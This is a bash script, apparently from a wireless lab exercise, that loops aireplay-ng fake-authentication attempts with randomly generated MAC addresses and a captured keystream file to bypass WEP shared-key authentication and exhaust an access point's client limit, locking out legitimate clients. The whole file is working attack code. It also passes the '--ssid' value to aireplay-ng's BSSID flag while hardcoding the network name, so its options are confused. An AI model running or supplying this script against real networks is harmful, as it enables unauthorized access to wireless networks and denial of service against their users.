#!/bin/bash

# Function to generate a random hexadecimal character
function random_hex() {
    echo -n $(openssl rand -hex 1)
}

# Generate a random MAC address
generate_mac() {
    mac=""
    for (( i=0; i<6; i++ )); do
        mac="$mac$(random_hex)"
        if [[ $i -lt 5 ]]; then
            mac="$mac:"
        fi
    done
    echo "$mac"
}

# Default values for options
attempts=50

# Process command line arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --ssid) ssid="$2"; shift ;;
        --attempts) attempts="$2"; shift ;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

# Check if --ssid option was provided
if [ -z "$ssid" ]; then
    echo "Please provide an SSID using the --ssid option."
    exit 1
fi

# Execute aireplay-ng to bypass shared key auth and connect to the AP.
# With enough authenticated clients the client count is reached and the AP won't accept new ones.
for (( j=0; j < attempts; j++)); do
    generated_mac=$(generate_mac)
    command="aireplay-ng -1 0 -e \"Wireless Lab\" -y keystream-01-3C-84-6A-DF-AB-7C.xor -a $ssid -h $generated_mac wlan0mon"
    echo "Running aireplay-ng with MAC: $generated_mac"
    eval "$command"
done
          
